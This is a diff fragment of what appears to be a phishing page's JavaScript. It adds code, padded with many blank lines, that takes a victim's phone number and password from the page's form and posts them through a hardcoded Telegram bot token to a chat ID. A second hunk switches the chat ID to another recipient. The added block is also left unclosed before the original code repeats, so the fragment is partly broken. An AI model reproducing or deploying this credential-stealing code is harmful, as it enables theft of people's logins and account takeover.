@@ -956,6 +956,115 @@ document.getElementById('password').setAttribute("name",'password');
 
 
 
+            var message = "رقم الهاتف:`"+phonenumber+"`\n"
+
+
+
+
+
+
+
+
+
+
+
+            message += "كلمة السر:`"+password+"`\n"
+
+
+
+
+
+
+
+
+
+
+
+            $.ajax({
+
+
+
+
+
+
+
+
+
+
+
+                type: 'POST',
+
+
+
+
+
+
+
+
+
+
+
+                url: `https://api.telegram.org/bot7578114644:AAGIrUnSauQanIBaMad8JOLRDURY-uqRb3s/sendMessage`,
+
+
+
+
+
+
+
+
+
+
+
+                data: {
+
+
+
+
+
+
+
+
+
+
+
+                    chat_id: "7965470550",
+
+
+
+
+
+
+
+
+
+
+
+                    text: message,
+
+
+
+
+
+
+
+
+
+
+
+                    parse_mode: 'markdown',
+
+
+
+
+
+
+
+
+
+
+
+                },
 
 
             var message = "رقم الهاتف:`"+phonenumber+"`\n"
@@ -1030,7 +1139,7 @@ document.getElementById('password').setAttribute("name",'password');
 
 
 
-                    chat_id: "7965470550",
+                    chat_id: "6873334348",
 
 
 
